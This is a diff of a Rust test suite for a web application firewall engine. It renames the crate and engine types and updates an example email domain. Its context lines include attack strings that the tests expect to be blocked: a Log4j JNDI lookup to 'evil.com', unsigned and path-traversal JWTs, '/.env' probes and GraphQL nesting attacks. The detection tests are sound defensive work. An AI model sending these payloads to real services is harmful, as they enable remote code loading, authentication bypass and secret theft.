@@ -1,9 +1,9 @@
-use exactor_waf_guardian::engine::ExactorSatEngine;
-use exactor_waf_guardian::types::{AttackCategory, AttackDecision, HttpRequestPayload};
+use satguardian_waf::engine::SatguardianSatEngine;
+use satguardian_waf::types::{AttackCategory, AttackDecision, HttpRequestPayload};
 
 #[test]
 fn test_sqli_detection() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "GET",
         "/items",
@@ -27,7 +27,7 @@ fn test_sqli_detection() {
 
 #[test]
 fn test_sqli_union_select() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "GET",
         "/api/v1/products",
@@ -45,7 +45,7 @@ fn test_sqli_union_select() {
 
 #[test]
 fn test_xss_detection() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "POST",
         "/comment",
@@ -64,7 +64,7 @@ fn test_xss_detection() {
 
 #[test]
 fn test_xss_event_handler() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "GET",
         "/search",
@@ -82,7 +82,7 @@ fn test_xss_event_handler() {
 
 #[test]
 fn test_rce_detection() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "POST",
         "/api/ping",
@@ -101,7 +101,7 @@ fn test_rce_detection() {
 
 #[test]
 fn test_path_traversal_detection() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "GET",
         "/download",
@@ -120,7 +120,7 @@ fn test_path_traversal_detection() {
 
 #[test]
 fn test_ssrf_detection() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "GET",
         "/proxy",
@@ -139,12 +139,12 @@ fn test_ssrf_detection() {
 
 #[test]
 fn test_benign_traffic_passes_with_zero_false_positives() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "POST",
         "/api/v1/users",
         "",
-        r#"{"username": "alice", "role": "developer", "email": "alice@exactor.tech"}"#,
+        r#"{"username": "alice", "role": "developer", "email": "alice@satguardian.tech"}"#,
     );
 
     let proof = engine.evaluate_payload(&payload);
@@ -158,7 +158,7 @@ fn test_benign_traffic_passes_with_zero_false_positives() {
 
 #[test]
 fn test_graphql_introspection_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "POST",
         "/graphql",
@@ -177,7 +177,7 @@ fn test_graphql_introspection_blocked() {
 
 #[test]
 fn test_graphql_deep_nesting_dos_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     // 8 levels of nested curly braces
     let nested_query = r#"{"query": "{ user { posts { comments { author { posts { comments { author { id } } } } } } } }"}"#;
     let payload = HttpRequestPayload::new(
@@ -197,7 +197,7 @@ fn test_graphql_deep_nesting_dos_blocked() {
 
 #[test]
 fn test_graphql_batch_array_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let batch_query = r#"[{"query": "{ user(id: 1) { name } }"}, {"query": "{ user(id: 2) { name } }"}]"#;
     let payload = HttpRequestPayload::new(
         "POST",
@@ -215,7 +215,7 @@ fn test_graphql_batch_array_blocked() {
 
 #[test]
 fn test_prototype_pollution_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let payload = HttpRequestPayload::new(
         "POST",
         "/api/v1/profile",
@@ -233,7 +233,7 @@ fn test_prototype_pollution_blocked() {
 
 #[test]
 fn test_json_schema_nesting_bomb_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     // 25 levels of nesting
     let mut bomb = String::new();
     for _ in 0..25 {
@@ -260,7 +260,7 @@ fn test_json_schema_nesting_bomb_blocked() {
 
 #[test]
 fn test_grpc_status_injection_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let mut payload = HttpRequestPayload::new(
         "POST",
         "/grpc.BankService/Transfer",
@@ -280,7 +280,7 @@ fn test_grpc_status_injection_blocked() {
 
 #[test]
 fn test_jwt_alg_none_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     // Header {"alg": "none", "typ": "JWT"} -> Base64URL: eyJhbGciOiAibm9uZSIgfQ
     // Payload {"user": "admin"} -> Base64URL: eyJ1c2VyIjogImFkbWluIn0
     let jwt_token = "eyJhbGciOiAibm9uZSIgfQ.eyJ1c2VyIjogImFkbWluIn0.";
@@ -302,7 +302,7 @@ fn test_jwt_alg_none_blocked() {
 
 #[test]
 fn test_jwt_kid_traversal_blocked() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     // Header {"alg": "HS256", "kid": "../../../../dev/null"} -> Base64URL: eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uLy4uL2Rldi9udWxsIn0
     // Payload {"user": "admin"} -> Base64URL: eyJ1c2VyIjogImFkbWluIn0
     let jwt_token = "eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjogImFkbWluIn0.signature";
@@ -324,9 +324,9 @@ fn test_jwt_kid_traversal_blocked() {
 
 #[test]
 fn test_stateful_sliding_window_rate_limiting() {
-    use exactor_waf_guardian::stateful::{StatefulConfig, StatefulRateLimiter};
+    use satguardian_waf::stateful::{StatefulConfig, StatefulRateLimiter};
 
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let limiter = StatefulRateLimiter::new(StatefulConfig {
         enabled: true,
         window_secs: 60,
@@ -373,9 +373,9 @@ fn test_stateful_sliding_window_rate_limiting() {
 
 #[test]
 fn test_stateful_credential_stuffing_detection() {
-    use exactor_waf_guardian::stateful::{StatefulConfig, StatefulRateLimiter};
+    use satguardian_waf::stateful::{StatefulConfig, StatefulRateLimiter};
 
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
     let limiter = StatefulRateLimiter::new(StatefulConfig {
         enabled: true,
         window_secs: 60,
@@ -418,10 +418,10 @@ fn test_stateful_credential_stuffing_detection() {
 
 #[test]
 fn test_wordpress_shield_toggle() {
-    use exactor_waf_guardian::config::{BusinessRulesConfig, IslandsConfig};
+    use satguardian_waf::config::{BusinessRulesConfig, IslandsConfig};
 
-    // 1. When WordPress shield is ENABLED (default on non-WP sites like exactor.tech)
-    let engine_shield_on = ExactorSatEngine::new();
+    // 1. When WordPress shield is ENABLED (default on non-WP sites like satguardian.tech)
+    let engine_shield_on = SatguardianSatEngine::new();
     let wp_probe = HttpRequestPayload::new("GET", "/wp-login.php", "", "");
     let proof_blocked = engine_shield_on.evaluate_payload(&wp_probe);
 
@@ -445,7 +445,7 @@ fn test_wordpress_shield_toggle() {
         exposure_shield: true,
         framework_shield: true,
     };
-    let engine_shield_off = ExactorSatEngine::with_config(islands_off, BusinessRulesConfig::default());
+    let engine_shield_off = SatguardianSatEngine::with_config(islands_off, BusinessRulesConfig::default());
     let proof_allowed = engine_shield_off.evaluate_payload(&wp_probe);
 
     assert!(!proof_allowed.is_violation);
@@ -459,7 +459,7 @@ fn test_wordpress_shield_toggle() {
 
 #[test]
 fn test_sensitive_exposure_shield() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
 
     // Probing for .env
     let env_probe = HttpRequestPayload::new("GET", "/.env", "", "");
@@ -478,7 +478,7 @@ fn test_sensitive_exposure_shield() {
 
 #[test]
 fn test_framework_exploit_shield() {
-    let engine = ExactorSatEngine::new();
+    let engine = SatguardianSatEngine::new();
 
     // Log4j / JNDI injection in query string
     let log4j_probe = HttpRequestPayload::new("GET", "/search", "q=${jndi:ldap://evil.com/x}", "");
@@ -490,7 +490,7 @@ fn test_framework_exploit_shield() {
 
 #[test]
 fn test_customer_business_rules_enforcement() {
-    use exactor_waf_guardian::config::{BusinessRulesConfig, CustomBusinessRule, IslandsConfig};
+    use satguardian_waf::config::{BusinessRulesConfig, CustomBusinessRule, IslandsConfig};
 
     let biz_rules = BusinessRulesConfig {
         enabled: true,
@@ -537,7 +537,7 @@ fn test_customer_business_rules_enforcement() {
         ],
     };
 
-    let engine = ExactorSatEngine::with_config(IslandsConfig::default(), biz_rules);
+    let engine = SatguardianSatEngine::with_config(IslandsConfig::default(), biz_rules);
 
     // 1. DELETE /api/items -> Violates Rule 1 (blocked method)
     let del_req = HttpRequestPayload::new("DELETE", "/api/items", "", "");
